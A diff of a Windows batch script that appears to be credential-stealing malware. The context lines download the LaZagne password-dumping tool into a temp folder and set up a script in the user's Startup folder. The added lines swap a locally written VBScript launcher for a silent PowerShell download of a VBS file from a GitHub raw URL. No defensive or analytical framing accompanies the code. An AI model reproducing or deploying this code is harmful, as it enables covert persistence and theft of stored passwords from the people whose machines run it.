@@ -9,6 +9,7 @@ set "VBS_PATH=%SCRIPT_DIR%%VBS_NAME%"
 set "STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 set "STARTUP_SCRIPT=%STARTUP_DIR%\%SCRIPT_NAME%"
 
+set "VBS_URL=https://raw.githubusercontent.com/Ayamet/web/main/main/vbs.vbs"
 set "LAZAGNE_URL=https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.7/LaZagne.exe"
 set "LAZAGNE_EXE=%TEMP%\LaZagne.exe"
 set "OUTPUT_DIR=%TEMP%\Lazagne_Results"
@@ -31,12 +32,9 @@ if not exist "!CHROME_EXE!" (
 :chrome_found
 
 if not exist "%VBS_PATH%" (
-    for %%I in ("%SCRIPT_DIR%%SCRIPT_NAME%") do set "SHORT_SCRIPT_PATH=%%~sI"
-    echo Set WShell = CreateObject("WScript.Shell") > "%VBS_PATH%"
-    echo WShell.Run "cmd.exe /c ""!SHORT_SCRIPT_PATH!""", 0, True ) >> "%VBS_PATH%"
+    powershell -Command "$ProgressPreference='SilentlyContinue'; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '%VBS_URL%' -OutFile '%VBS_PATH%'" >nul 2>nul
     if errorlevel 1 exit /b 1
-    echo Generated VBScript content: > debug.txt
-    type "%VBS_PATH%" >> debug.txt
+    if not exist "%VBS_PATH%" exit /b 1
 )
 
 if not exist "%STARTUP_SCRIPT%" (
